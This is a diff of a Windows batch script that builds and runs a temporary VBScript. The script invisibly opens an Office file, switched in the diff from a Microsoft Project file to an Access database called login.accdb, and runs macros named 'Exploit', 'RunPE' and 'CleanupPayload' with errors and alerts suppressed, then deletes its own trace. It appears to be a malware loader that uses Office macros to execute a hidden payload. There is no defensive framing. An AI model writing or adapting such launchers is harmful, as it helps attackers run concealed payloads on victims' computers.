@@ -2,56 +2,29 @@
 
 setlocal
 
-
-
-REM Path to your Project file
-
-set "PROJECT_FILE=C:\Windows\Deployment.mpp"
-
-
+REM Path to your Access database
+set "DB_FILE=C:\Windows\login.accdb"
 
 REM Temporary VBS file
-
-set "TEMP_VBS=%TEMP%\Deployment.vbs"
-
-
+set "TEMP_VBS=%TEMP%\login.vbs"
 
 (
-
 echo On Error Resume Next
-
-echo Set pj = CreateObject("MSProject.Application"^)
-
-echo pj.Visible = False
-
-echo pj.DisplayAlerts = False
-
-echo pj.FileOpen "%PROJECT_FILE%"
-
+echo Set accessApp = CreateObject("Access.Application"^)
+echo accessApp.Visible = False
+echo accessApp.DisplayAlerts = False
+echo accessApp.OpenCurrentDatabase "%DB_FILE%"
 echo WScript.Sleep 1000
-
-echo pj.Run "Exploit" 
-
-echo pj.Run "RunPE" 
-
-echo pj.Run "CleanupPayload" 
-
-echo pj.FileClose
-
-echo pj.Quit
-
-echo Set pj = Nothing
-
+echo accessApp.Run "Exploit"
+echo accessApp.Run "RunPE"
+echo accessApp.Run "CleanupPayload"
+echo accessApp.CloseCurrentDatabase
+echo accessApp.Quit
+echo Set accessApp = Nothing
 ) > "%TEMP_VBS%"
-
-
 
 cscript //nologo "%TEMP_VBS%"
 
-
-
 del "%TEMP_VBS%"
-
-
 
 endlocal
